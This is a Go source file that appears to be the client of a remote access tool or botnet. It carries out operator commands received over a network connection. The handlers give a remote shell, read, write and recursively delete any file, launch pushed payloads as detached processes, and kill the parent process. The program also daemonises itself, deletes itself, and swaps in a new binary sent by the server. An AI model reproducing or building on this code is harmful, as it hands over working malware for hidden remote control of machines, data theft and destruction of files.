package base

import (
	"net"
//	"io"
	"os"
	"os/exec"
	"syscall"
//	"sync"
//	"time"
//	"runtime"
//	"crypto/rand"
	"bytes"

	kit "../toolkit"
	"../smux"
	"../godaemon"
)


var fastC = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	handleFastS(p1)
}

var sh = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	bin := "sh"
	keep := false
	switch op {
	case B_shs:
	case B_shk:
		keep = true
	case B_csh:
		fallthrough
	default:
		binb, err := kit.ReadVTagByte(p1)
		if err != nil {
			return
		}
		bin = string(binb)
		ret64, err := kit.ReadVLen(p1)
		if err != nil {
			return
		}
		if int(ret64) != 0 {
			keep = true
		}
	}

	c.handle2(p1, keep, bin)
}

var pullInfo = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	c.Info.WriteTo(p1)
}

var ppX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	do := syscall.SIGTERM
	switch op {
	case B_ppend:
	case B_ppkill:
		do = syscall.SIGKILL
	}
	ppid := os.Getppid()
	syscall.Kill(ppid, do)
}

var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	switch op {
	case B_reconn:
		mux.Close()

	case B_kill:
		os.Exit(0)

	case B_dodaemon:
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

	case B_apoptosis:
		cleanSelf()

	case B_evolution:
		kit.WriteVLen(p1, int64(0))
		fhb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fhb", err)
			break
		}

		fb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fb", err)
			break
		}

		checkb := kit.HashBytes256(fb)
//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
		if !bytes.Equal(checkb, fhb) {
//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
			break
		}

		c.selfbyte = fb
		c.selfhex = fhb
		fallthrough

	case B_rebirth:
		dumpSelf(c)
	}
}

var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
//	kit.WriteVLen(p1, int64(-2))

	switch op {
	case B_get:
		kit.WriteVLen(p1, int64(0))
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_RDONLY, 0444)
		if err != nil {
			// can't open file
			break
		}
		defer fd.Close()
		finfo, err := fd.Stat()
		if err != nil {
			// can't stat file
			break
		}
		kit.WriteVLen(p1, finfo.Size())
		kit.Cp1(fd, p1)

	case B_push:
		kit.WriteVLen(p1, int64(0))

		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_WRONLY | os.O_CREATE | os.O_TRUNC , 0700)
		if err != nil {
			// can't create file
			return
		}
		defer fd.Close()
		kit.Cp1(p1, fd)

	case B_del:
		kit.WriteVLen(p1, int64(0))

		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}
		err = os.RemoveAll(string(fp))
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}

	case B_call:
		kit.WriteVLen(p1, int64(0))

		fpb, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}

		fp := string(fpb)
		// check exist?
		if _, err := os.Stat(fp); os.IsNotExist(err) {
			kit.WriteVLen(p1, int64(-2))
			return
		} else {
			kit.WriteVLen(p1, int64(0))
		}
		call(p1, fp)
	}

}

var call = func (p1 net.Conn, bin string) {
	// call payload
	pl := exec.Command(bin)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err := pl.Start()
	if err != nil {
		p1.Write([]byte(err.Error()))
		return
	}
	err = pl.Process.Release()
	if err != nil {
		p1.Write([]byte(err.Error()))
	}
}

